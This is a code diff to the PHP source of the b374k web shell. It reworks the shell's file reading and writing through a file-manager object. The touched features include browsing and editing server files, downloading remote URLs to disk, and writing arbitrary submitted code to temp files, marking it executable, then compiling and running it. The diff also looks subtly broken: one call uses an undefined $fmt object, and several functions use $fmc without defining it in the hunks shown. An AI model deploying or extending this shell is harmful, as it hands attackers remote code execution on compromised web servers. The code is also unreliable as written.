@@ -2,10 +2,6 @@
 $GLOBALS['ver'] = "3.2.3";
 $GLOBALS['title'] = "b374k";
 
-if (!defined('DETECT_SYS_CHARSET')) {
-	define('DETECT_SYS_CHARSET', DIRECTORY_SEPARATOR == '\\' ? 'gb2312' : 'utf-8');
-}
-
 @ob_start();
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 // register_shutdown_function(function(){ var_dump(error_get_last()); });
@@ -214,6 +210,12 @@ if (!function_exists('is_win')) {
 	}
 }
 
+if (!function_exists('value')) {
+	function value($value) {
+		return (is_callable($value) and !is_string($value)) ? call_user_func($value) : $value;
+	}
+}
+
 if (!function_exists('fix_magic_quote')) {
 	function fix_magic_quote($arr) {
 		$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
@@ -374,12 +376,12 @@ if (!function_exists('zip')) {
 						if (is_dir($iterator)) {
 							$zip->addEmptyDir(str_replace($file . '/', '', $iterator . '/'));
 						} else if (is_file($iterator)) {
-							$zip->addFromString(str_replace($file . '/', '', $iterator), read_file($iterator));
+							$zip->addFromString(str_replace($file . '/', '', $iterator), $fmc->get($iterator));
 						}
 
 					}
 				} elseif (is_file($file)) {
-					$zip->addFromString(basename($file), read_file($file));
+					$zip->addFromString(basename($file), $fmt->read_file($file));
 				}
 
 			}
@@ -497,12 +499,12 @@ if (!function_exists('download')) {
 
 		$filename = basename($url);
 
-		if ($content = read_file($url)) {
+		if ($content = $fmc->get($url)) {
 			if (is_file($saveas)) {
 				unlink($saveas);
 			}
 
-			if (write_file($saveas, $content)) {
+			if ($fmc->put($saveas, $content)) {
 				return true;
 			}
 		}
@@ -589,31 +591,6 @@ if (!function_exists('copys')) {
 	}
 }
 
-if (!function_exists('read_file')) {
-	function read_file($file) {
-		$content = false;
-		if ($fh = @fopen($file, "rb")) {
-			$content = "";
-			while (!feof($fh)) {
-				$content .= fread($fh, 8192);
-			}
-		}
-		return $content;
-	}
-}
-
-if (!function_exists('write_file')) {
-	function write_file($file, $content) {
-		if ($fh = @fopen($file, "wb")) {
-			if (fwrite($fh, $content) !== false) {
-				return true;
-			}
-
-		}
-		return false;
-	}
-}
-
 if (!function_exists('view_file')) {
 	function view_file($file, $type, $preserveTimestamp = 'true') {
 		$fmc = new FileManagerClass();
@@ -648,7 +625,7 @@ if (!function_exists('view_file')) {
 					"hl_html" => ini_get('highlight.html'),
 					"hl_comment" => ini_get('highlight.comment'),
 				);
-				$content = highlight_string(read_file($file), true);
+				$content = highlight_string($fmc->get($file), true);
 				foreach ($hl_arr as $k => $v) {
 					$content = str_replace("<font color=\"" . $v . "\">", "<font class='" . $k . "'>", $content);
 					$content = str_replace("<span style=\"color: " . $v . "\">", "<span class='" . $k . "'>", $content);
@@ -664,17 +641,17 @@ if (!function_exists('view_file')) {
 					$imglink = "";
 				}
 
-				$content = "<center>" . $image_info_h . "<br>" . $imglink . "<img id='viewImage' style='width:" . $width . "px;' src='data:" . $file_info['image_info']['mime'] . ";base64," . base64_encode(read_file($file)) . "' alt='" . $file . "'></center>";
+				$content = "<center>" . $image_info_h . "<br>" . $imglink . "<img id='viewImage' style='width:" . $width . "px;' src='data:" . $file_info['image_info']['mime'] . ";base64," . base64_encode($fmc->get($file)) . "' alt='" . $file . "'></center>";
 			} elseif ($type == "multimedia") {
 				$content = "<center><video controls><source src='' type='" . $info['mime'] . "'></video><p><span class='button' onclick=\"multimedia('" . html_safe(addslashes($file)) . "');\">Load Multimedia File</span></p></center>";
 			} elseif ($type == "edit") {
 				$preservecbox = ($preserveTimestamp == 'true') ? " cBoxSelected" : "";
-				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">" . html_safe(read_file($file)) . "</textarea></td></tr></table>";
+				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">" . html_safe($fmc->get($file)) . "</textarea></td></tr></table>";
 			} elseif ($type == "hex") {
 				$preservecbox = ($preserveTimestamp == 'true') ? " cBoxSelected" : "";
-				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">" . bin2hex(read_file($file)) . "</textarea></td></tr></table>";
+				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">" . bin2hex($fmc->get($file)) . "</textarea></td></tr></table>";
 			} else {
-				$content = "<pre>" . html_safe(read_file($file)) . "</pre>";
+				$content = "<pre>" . html_safe($fmc->get($file)) . "</pre>";
 			}
 
 			$output .= "
@@ -921,7 +898,7 @@ if (!function_exists('eval_go')) {
 				$filename = $evalType . $uniq;
 				$path = $filename;
 				$res .= "Temporary file : " . $path;
-				if (write_file($path, $evalCode)) {
+				if ($fmc->put($path, $evalCode)) {
 					$res .= " (ok)\n";
 					$res .= "Setting permissions : 0755";
 					if (chmod($path, 0755)) {
@@ -961,7 +938,7 @@ if (!function_exists('eval_go')) {
 				$filename = $evalType . $uniq . ".c";
 				$path = $filename;
 				$res .= "Temporary file : " . $path;
-				if (write_file($path, $evalCode)) {
+				if ($fmc->put($path, $evalCode)) {
 					$res .= " (ok)\n";
 					$ext = (is_win()) ? ".exe" : ".out";
 					$pathres = $filename . $ext;
@@ -1028,7 +1005,7 @@ if (!function_exists('eval_go')) {
 
 				$path = $filename . ".java";
 				$res .= "Temporary file : " . $path;
-				if (write_file($path, $evalCode)) {
+				if ($fmc->put($path, $evalCode)) {
 					$res .= " (ok)\n";
 					$cmd = "javac " . $evalOptions . $path;
 					$res .= "Compiling : " . $cmd;
@@ -1085,7 +1062,7 @@ if (!function_exists('eval_go')) {
 				$filename = $evalType . $uniq . ".exe";
 				$path = $filename;
 				$res .= "Temporary file : " . $path;
-				if (write_file($path, $evalCode)) {
+				if ($fmc->put($path, $evalCode)) {
 					$res .= " (ok)\n";
 					$cmd = $path . $evalArguments;
 					$res .= "Execute : " . $cmd . "\n";
